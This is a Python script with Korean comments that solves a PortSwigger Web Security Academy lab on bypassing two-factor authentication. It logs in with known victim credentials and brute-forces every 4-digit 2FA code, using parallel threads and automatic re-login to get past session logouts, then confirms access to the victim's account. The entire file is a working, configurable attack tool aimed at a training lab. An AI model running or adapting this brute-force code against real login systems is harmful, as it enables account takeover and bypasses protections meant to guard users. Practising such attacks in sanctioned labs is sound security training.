#!/usr/bin/env python3
"""
Authentication - 2FA bypass using a brute-force attack
PortSwigger Lab:
  https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack

상황:
  carlos 자격증명(carlos:montoya)은 알지만 2FA 코드는 모른다.
  코드가 4자리 숫자이고 시도 제한이 없으나, "잘못된 코드 2회" 면 세션이 로그아웃된다.
  → Burp 매크로처럼 매번(또는 N회마다) 다시 로그인해 새 세션으로 코드를 brute-force.

성능 최적화:
  - 스레드(기본 10) 병렬 처리: 각 작업이 독립 세션으로 로그인/시도
    (로그인이 2FA 코드를 재생성하지 않으므로 병렬 안전)
  - 스레드별 TCP 연결 재사용: requests.Session 을 작업 내에서 유지하고 쿠키만 초기화
  - CSRF 자동 감지: 폼에 csrf 가 없으면 GET /login·GET /login2 를 생략해 요청 수 절감
    (없으면 코드당 실질 1요청: POST /login + POST /login2 를 2코드당 1회씩)

사용 예시:
  python3 14-authentication-2fa-bruteforce.py \\
    --target "https://LAB-ID.web-security-academy.net" \\
    --victim-username carlos --victim-password montoya --verify
"""

import argparse
import os
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 15
SUCCESS_CODES = (301, 302, 303, 307, 308)


def find_csrf(html: str, field: str = "csrf") -> str | None:
    m = (re.search(rf'name=["\']?{field}["\']?\s+value=["\']?([^"\'\s>]+)', html)
         or re.search(rf'value=["\']?([^"\'\s>]+)["\']?\s+name=["\']?{field}', html))
    return m.group(1) if m else None


class Worker:
    def __init__(self, args, stop, found, lock, stats):
        self.a = args
        self.base = args.target.rstrip("/")
        self.stop = stop
        self.found = found
        self.lock = lock
        self.stats = stats
        self.login_get_needed = True   # csrf 있을 때만 GET /login
        self.mfa_get_needed = True
        self.probed = False

    # ---- 세션 준비 ----
    def prepare(self, s: requests.Session):
        """로그아웃 상태에서 로그인 → 2FA 페이지까지. (s: 재사용할 세션)

        Returns:
            (성공여부, mfa csrf 또는 None)
        """
        s.cookies.clear()
        data = {"username": self.a.victim_username,
                "password": self.a.victim_password}
        if self.login_get_needed:
            lp = s.get(self.base + self.a.login_path, timeout=TIMEOUT)
            c = find_csrf(lp.text)
            if not c:
                self.login_get_needed = False   # 이후 생략
            else:
                data["csrf"] = c
        lr = s.post(self.base + self.a.login_path, data=data, timeout=TIMEOUT,
                    allow_redirects=False)
        if lr.status_code not in SUCCESS_CODES:
            return False, None
        csrf = None
        if self.mfa_get_needed:
            mp = s.get(self.base + self.a.mfa_path, timeout=TIMEOUT,
                       allow_redirects=True)
            csrf = find_csrf(mp.text)
            if not csrf:
                self.mfa_get_needed = False
        return True, csrf

    def logged_out(self, resp) -> bool:
        loc = resp.headers.get("Location", "")
        if resp.status_code in SUCCESS_CODES:
            return "my-account" not in loc
        text = resp.text
        return 'name="username"' in text and "mfa-code" not in text

    def try_code(self, s, csrf, code) -> tuple[bool, bool]:
        """(성공, 로그아웃) 반환."""
        data = {"mfa-code": code}
        if csrf:
            data["csrf"] = csrf
        resp = s.post(self.base + self.a.mfa_path, data=data,
                      timeout=TIMEOUT, allow_redirects=False)
        with self.lock:
            self.stats["count"] += 1
        if resp.status_code in SUCCESS_CODES and \
                "my-account" in resp.headers.get("Location", ""):
            return True, False
        return False, self.logged_out(resp)

    # ---- 작업(코드 구간) 처리 ----
    def run(self, codes):
        s = requests.Session()
        s.verify = False
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=1, pool_maxsize=1, max_retries=0)
        s.mount("https://", adapter)
        s.mount("http://", adapter)

        i, n = 0, len(codes)
        while i < n and not self.stop.is_set():
            ok_login, csrf = self.prepare(s)
            if not ok_login:
                return  # 로그인 단계 문제
            attempts = 0
            while i < n and attempts < self.a.attempts_per_session \
                    and not self.stop.is_set():
                code = codes[i]
                i += 1
                attempts += 1
                try:
                    ok, out = self.try_code(s, csrf, code)
                except requests.exceptions.RequestException:
                    break
                if ok:
                    with self.lock:
                        if not self.stop.is_set():
                            self.stop.set()
                            self.found.update(code=code, session=s,
                                              location="/my-account")
                            print(f"\n    code={code}  <== 성공")
                    return
                if out:
                    break


def main() -> None:
    parser = argparse.ArgumentParser(
        description="2FA 코드 brute-force (자동 재로그인 방식)"
    )
    parser.add_argument("--target", required=True,
                        help="대상 베이스 URL (예: https://LAB.web-security-academy.net)")
    parser.add_argument("--victim-username", default="carlos",
                        help="피해자 username (기본: carlos)")
    parser.add_argument("--victim-password", default="montoya",
                        help="피해자 password (기본: montoya)")
    parser.add_argument("--login-path", default="/login",
                        help="로그인 경로 (기본: /login)")
    parser.add_argument("--mfa-path", default="/login2",
                        help="2FA 경로 (기본: /login2)")
    parser.add_argument("--mfa-field", default="mfa-code",
                        help="2FA 코드 필드명 (기본: mfa-code)")
    parser.add_argument("--code-length", type=int, default=4,
                        help="코드 자릿수 (기본: 4)")
    parser.add_argument("--start", type=int, default=0, help="시작 코드 (기본: 0)")
    parser.add_argument("--end", type=int, default=None,
                        help="종료 코드 (기본: 10^length-1)")
    parser.add_argument("--attempts-per-session", type=int, default=2,
                        help="세션당 코드 시도 횟수 (기본: 2; 로그아웃 전)")
    parser.add_argument("--rounds", type=int, default=3,
                        help="코드 재생성 대비 전체 범위 반복 (기본: 3)")
    parser.add_argument("--threads", type=int, default=10,
                        help="동시 작업 수 (기본: 10; 이 랩은 병렬 안전)")
    parser.add_argument("--verify", action="store_true",
                        help="찾은 뒤 계정 페이지 접근 확인")
    parser.add_argument("--account-path", default="/my-account",
                        help="검증용 계정 경로 (기본: /my-account)")
    args = parser.parse_args()

    end = args.end if args.end is not None else (10 ** args.code_length - 1)
    all_codes = [f"{n:0{args.code_length}d}" for n in range(args.start, end + 1)]

    print(f"[*] 대상        : {args.target}")
    print(f"    victim      : {args.victim_username}")
    print(f"    코드 범위   : {args.start}~{end} ({len(all_codes)}개), "
          f"자릿수={args.code_length}")
    print(f"    세션당 시도 : {args.attempts_per_session}, 반복: {args.rounds}, "
          f"threads={args.threads}")

    stop = threading.Event()
    found = {}
    lock = threading.Lock()
    stats = {"count": 0}
    nthreads = max(1, args.threads)
    per = (len(all_codes) + nthreads - 1) // nthreads
    chunks = [all_codes[i:i + per] for i in range(0, len(all_codes), per)]

    import time

    def monitor():
        """진행률/속도/ETA 를 5초마다 출력."""
        last = 0
        last_t = time.time()
        while not stop.is_set():
            time.sleep(5)
            with lock:
                now = stats["count"]
            nt = time.time()
            rate = (now - last) / max(nt - last_t, 0.001)
            total = len(all_codes)
            elapsed = nt - t0
            remain = (total - now) / rate if rate > 0 else float("inf")
            print(f"    [진행] {now}/{total} 코드 시도, "
                  f"{rate:.1f} req/s, 경과 {elapsed:.0f}s, "
                  f"예상 남은 {remain:.0f}s")
            last, last_t = now, nt

    t0 = time.time()
    mon = threading.Thread(target=monitor, daemon=True)
    mon.start()
    for rnd in range(1, args.rounds + 1):
        if stop.is_set():
            break
        print(f"\n[*] 라운드 {rnd}/{args.rounds} — {len(all_codes)}개 코드")
        workers = [Worker(args, stop, found, lock, stats) for _ in chunks]
        with ThreadPoolExecutor(max_workers=nthreads) as ex:
            futures = [ex.submit(w.run, ch) for w, ch in zip(workers, chunks)]
            for f in futures:
                f.result()
        print(f"    라운드 {rnd} 종료 ({time.time() - t0:.0f}s 경과)")

    if not found:
        print("\n[-] 코드를 찾지 못했습니다.")
        print("    → 코드가 재생성되었을 수 있습니다. 재실행하거나 --rounds 증가")
        sys.exit(1)

    print(f"\n[+] 2FA 코드 발견: {found['code']}")

    if args.verify and found.get("session") is not None:
        s = found["session"]
        acct = s.get(args.target.rstrip("/") + args.account_path,
                     timeout=TIMEOUT, allow_redirects=True)
        print(f"[*] 검증 — GET {args.account_path} → status={acct.status_code}, "
              f"len={len(acct.text)}")
        m = re.search(r'(?i)your username is:?\s*(?:<[^>]+>)?\s*([^<\s]+)', acct.text)
        if m:
            print(f"[+] 로그인 사용자: {m.group(1)}")
        if acct.status_code == 200 and \
                (not m or m.group(1).lower() == args.victim_username.lower()):
            print(f"[✓] {args.victim_username} 계정 로그인 확인")


if __name__ == "__main__":
    main()
